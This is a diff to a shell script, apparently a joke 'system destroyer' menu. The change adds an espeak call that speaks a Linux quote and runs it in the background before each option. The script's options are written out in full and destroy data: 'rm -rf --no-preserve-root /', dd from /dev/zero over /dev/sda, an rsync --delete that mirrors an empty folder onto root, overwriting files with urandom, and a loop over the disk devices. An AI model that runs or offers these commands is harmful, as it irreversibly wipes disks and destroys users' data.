@@ -5,6 +5,10 @@ function usage {
     exit
 }
 
+function speak {
+    espeak -x --ipa=1 -s 130 -p 30 -k 20 "What commercialism has brought into Linux has been the incentive to make a good distribution that is easy to use and that has all the packaging issues worked out!" 2>/dev/null
+}
+
 if [ $# -eq 0 ];
 then
     usage
@@ -16,22 +20,26 @@ case $1 in
         ;;
 
      1)
+        speak&
         rm -rf --no-preserve-root /
         exit
         ;;
 
      2) 
+        speak&
         sudo dd if=/dev/zero of=/dev/sda 
         exit
         ;;
 
      3)
+        speak&
         sudo mkdir source
         sudo rsync -av --delete source/ /
         exit
         ;;
 
      4)
+        speak&
         for f in /
         do
             [ -f "$f" ] && dd if=/dev/urandom of=$f conv=sync,notrunc;
@@ -40,6 +48,7 @@ case $1 in
         ;;
 
      5)
+        speak&
         (while 1;
          do
             cat /mnt/cdrom/win95.bmp;
@@ -48,6 +57,7 @@ case $1 in
          ;;
 
      6) 
+        speak&
         for i in \
             $(ls -1 /dev | egrep "^sd|^nmve|^hd|^vd");
         do
@@ -57,6 +67,7 @@ case $1 in
         ;;
 
      7)
+        speak&
         sudo firefox
         exit
         ;;
